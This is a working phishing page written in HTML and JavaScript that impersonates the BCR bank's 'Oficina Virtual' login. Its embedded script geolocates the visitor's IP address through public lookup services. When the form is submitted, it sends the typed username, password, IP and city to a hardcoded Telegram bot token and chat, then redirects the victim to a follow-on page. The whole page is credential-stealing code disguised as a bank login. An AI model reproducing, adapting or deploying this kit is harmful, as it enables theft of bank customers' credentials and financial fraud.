<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="https://ik.imagekit.io/eruobiiei/delbc/style.css" rel="stylesheet" type="text/css">

<title>BCR</title>
<script>
//EL TELEGRAM	  
//bot token
var telegram_bot_id = "6989339920:AAHQzBow1uAijCWHO75g8vBhIKcgisg4ouw";
//chat id
var chat_id = '-4131847359';
 </script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
  <script>
         $.getJSON("https://api.ipify.org?format=json",
          function(data) {
             $("#gfg").html(data.ip);
         })
 </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
    })
      </script>
	  
<script>
		  
var u_name, pax, pax2, ip, ip2;

var ready = function () {
    usse = document.getElementById("usser").value;
    pax = document.getElementById("pass").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "D4T0s-BCR\nUsuario: " + usse + "\nClave: " + pax +"\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
	  window.location = 'index2.php';
   
        console.log(response);
   

   });
    return false;
};

</script>


<script type="application/javascript">
function getIP(json) {
    document.getElementById("ipaddress").value = json.ip;
}
</script>

</head>
<body>

	<div class="head">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/logo.gif" class="logo">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/Certificado.svg" class="headimg1">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/Contactenos.svg" class="headimg2">
		<a href="#" class="linkhead1">Certificaciones</a>
		<a href="#" class="linkhead2">Contáctenos</a>
	</div>
	<div class="head2">
		
		<span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
		
	</div>
	<div class="costilla">
	<span class="seguridadtxt">Seguridad</span>
	<img class="imgcostilla1" src="https://ik.imagekit.io/eruobiiei/delbc/Consideraciones.svg">	
	<img class="imgcostilla2" src="https://ik.imagekit.io/eruobiiei/delbc/reglamento.svg">	
		<span class="textcostilla1">Consideraciones</span>
		<span class="textcostilla2">Reglamentos</span>
		
		
	</div>
	
	<div id="vista1">
	
	<div class="containerimg">	
		<div class="divform1">

			<form action="" method="post" onsubmit=" return sender()">
			
			<p id="gfg"  hidden=""></p>
						<p id="address"  hidden=""></p>

			<span class="ingresartxt">Ingresar</span>
			
			<hr class="line1" color="#C4C4C4">
			
			
			<img class="userimg" src="https://ik.imagekit.io/eruobiiei/delbc/Personalizar.svg">
			<img class="passimg" src="https://ik.imagekit.io/eruobiiei/delbc/Seguridad.svg">
			
	<div class="floating-label">      

		<input class="user" type="text" placeholder=" " id="usser" name="usser" onfocus="" onkeyup="" autocomplete="off" required="">

		<span class="highlight"></span>
		<label>Usuario</label>

	</div>
			
			
	<div class="floating-label2">      

		<input class="pass" type="password" placeholder=" " id="pass" name="pass"  autocomplete="off" required="">
	
	
		<span class="highlight2"></span>
		<label>Contraseña</label>
			
					<img id="imgpass1" src="https://ik.imagekit.io/eruobiiei/delbc/ver.png" class="ver" onclick=" pass1(); pass2(); pass11();">
			<img id="imgpass2" src="https://ik.imagekit.io/eruobiiei/delbc/ver2.png" class="ver" onclick=" pass3(); pass4(); pass33();" style="display: none;">
		

	</div>
			
		
			<button type="submit" class="btn-uno" >Ingresar</button>	
			
			<button class="btn-dos" type="submit">Recuperar datos de ingreso</button>
			
			
		<input type="checkbox" name="checkbox" class="digital">
		<label class="labelchk">Certificado Digital</label>
			
			</form>
			
		
		</div>
		
		<div class="divform2">
			
			
						<span class="ingresartxt">Registrarse</span>
			
			<hr class="line1" color="#C4C4C4">
				
			<span class="registertext">
			
			Regístrese aquí si desea utilizar los servicios de B@nca Digital.<br><br>

Para registrarse requiere ser cliente y tener al menos un producto activo.
			
			</span>
			
			
			<button class="btn-tres">Continuar</button>
						
		</div>
		
		
		
		
	<div class="formcontainer">
		
	</div>
	
	</div>
	
</div>	<!-- Fin vista1 -->


	
	<div class="footer"><span class="footertext"> BCR © Derechos Reservados 2023.     Contáctenos: CentroAsistenciaBCR@bancobcr.com</span></div>
	
</body>
</html>